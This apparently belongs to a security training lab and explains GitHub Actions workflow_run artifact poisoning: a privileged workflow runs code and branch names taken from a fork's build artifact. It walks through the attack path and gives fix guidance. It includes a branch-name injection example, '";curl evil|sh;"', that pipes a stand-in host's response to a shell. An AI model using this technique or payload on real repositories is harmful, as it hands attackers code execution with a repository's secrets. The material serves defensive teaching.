# Scenario 11 — workflow_run artifact poisoning

**OWASP:** CICD-SEC-4 (Poisoned Pipeline Execution) · **MITRE ATT&CK:** T1195 (Supply Chain Compromise)

## Target

A two-workflow pair that splits an untrusted build from a privileged follow-up:

| File | Role | Flaw |
|---|---|---|
| `build.yml` | producer, runs on `pull_request` (fork PRs included) | uploads the **entire** checked-out tree as the `pr-build` artifact |
| `comment.yml` | consumer, runs on `workflow_run` in the base repo | downloads that artifact, checks out the fork's head, and **executes code from it** with the base repo's token and secrets |

## The vulnerability

`workflow_run` exists to let a privileged job react to another workflow *after* it finishes. The catch is where it runs: a `workflow_run` handler always executes in the **base repository's** context — on the default branch, with the base repo's secrets and a read/write `GITHUB_TOKEN` — even when the run that triggered it came from a fork pull request.

GitHub designed it this way so the fork's low-privilege build and the privileged follow-up stay separate. But the fork still controls everything that build *produced*:

- the **artifacts** it uploaded (their contents and filenames),
- the **head branch** name and the **commit title**,
- any file in the tree, if the producer uploads the whole checkout.

So the trust boundary is the *data crossing between the two runs*, and this consumer walks straight across it. It does all three of the things a `workflow_run` handler must never do:

1. **Checks out the fork's head** (`ref: ${{ github.event.workflow_run.head_branch }}`) — reintroducing the pwn-request problem.
2. **Runs code out of the downloaded artifact** (`node ./scripts/comment.js`) — the artifact is attacker-controlled bytes.
3. **Interpolates untrusted `workflow_run` context into a shell** (`echo "... ${{ github.event.workflow_run.head_branch }}"`) — a branch named `";curl evil|sh;"` injects commands.

Any one of these hands a fork-PR author arbitrary code execution with the base repo's privileges. This is the artifact-poisoning variant of a pwn request: the fork never touches the privileged job directly — it poisons what that job later consumes.

## Attack path

1. Attacker forks the repo and opens a pull request.
2. `build.yml` runs on their PR (low privilege) and uploads the fork's tree — including `scripts/comment.js` the attacker added — as `pr-build`.
3. When it finishes, `comment.yml` fires on `workflow_run` in the base repo context.
4. It downloads `pr-build`, checks out the fork's branch, and runs `node ./scripts/comment.js` — attacker code — with `GITHUB_TOKEN` and `DUMMY_DEPLOY_KEY` in the environment.
5. The payload exfiltrates secrets or pushes to a protected branch. The PR never has to be merged, or even reviewed.

## Payload

[`payload/comment.js`](payload/comment.js) is a benign proof: it records which privileged secrets were in reach and writes `poisoned.proof.json`. It sends nothing anywhere — it only demonstrates that attacker-supplied code executed in the privileged context.

## Simulation

[`simulate.sh`](simulate.sh) models the mechanism offline (a live demo needs two repos and a fork):

```bash
./simulate.sh                 # judge the vulnerable comment.yml
./simulate.sh <workflow.yml>  # judge a specific workflow
```

Part 1 builds a fake fork artifact carrying an attacker script and shows a *blind* consumer execute it (POISONED) while a *validating* consumer reads only the PR number as data (SAFE). Part 2 inspects a workflow for the three unsafe idioms and reports `POISONABLE` (exit 1) or `SAFE` (exit 0).

## Fix direction

See `hardened/11-workflow-run-poisoning/`. Summary:

1. In a `workflow_run` handler, treat **all** upstream output as untrusted data.
2. Never check out the triggering head; never execute downloaded artifacts.
3. Have the producer upload the **minimal** data the consumer needs (a PR number), not the tree — and validate it anyway (`[0-9]+`).
4. Pass any `workflow_run` context through `env:` and reference `"$VAR"`; never `${{ }}` in a shell.
5. Keep a read-only permissions floor and grant the single write scope the job needs.
